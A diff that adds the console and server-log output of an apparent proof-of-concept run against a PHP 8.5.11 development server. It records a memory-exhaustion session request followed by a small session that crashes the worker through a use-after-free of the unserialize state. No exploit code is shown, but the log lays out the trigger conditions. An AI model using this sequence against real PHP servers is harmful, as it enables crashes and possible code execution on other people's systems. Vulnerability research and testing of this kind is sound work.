@@ -1,0 +1,21 @@
+[*] php          /home/hatch/workspace/php2shell/poc-109619/build/php-8.5.11/sapi/cli/php
+[*] server       http://127.0.0.1:34413/  memory_limit=16M
+[*] req1         seeded session: 4194317 bytes (1048576 elements)
+[*] req1         HTTP/1.0 500 Internal Server Error  oom=True  alive=True
+[*] req2         seeded session: x|i:1;
+[*] req2         <no response>  exit=-11  asan=False
+[+] worker crashed: BG(unserialize) reused the freed php_unserialize_data
+
+=== server log ===
+[Sat Oct 24 16:03:19 2026] PHP 8.5.11 Development Server (http://127.0.0.1:34413) started
+[Sat Oct 24 16:03:19 2026] 127.0.0.1:36076 Accepted
+[Sat Oct 24 16:03:19 2026] 127.0.0.1:36076 Closed without sending a request; it was probably just an unused speculative preconnection
+[Sat Oct 24 16:03:19 2026] 127.0.0.1:36076 Closing
+[Sat Oct 24 16:03:19 2026] 127.0.0.1:36090 Accepted
+[Sat Oct 24 16:03:19 2026] PHP Fatal error:  Allowed memory size of 16777216 bytes exhausted (tried to allocate 41943040 bytes) in Unknown on line 0
+Stack trace:
+#0 {main}
+[Sat Oct 24 16:03:19 2026] PHP Warning:  PHP Request Startup: Failed to decode session object. Session has been destroyed in Unknown on line 0
+[Sat Oct 24 16:03:19 2026] 127.0.0.1:36090 Closing
+[Sat Oct 24 16:03:19 2026] 127.0.0.1:36106 Accepted
+
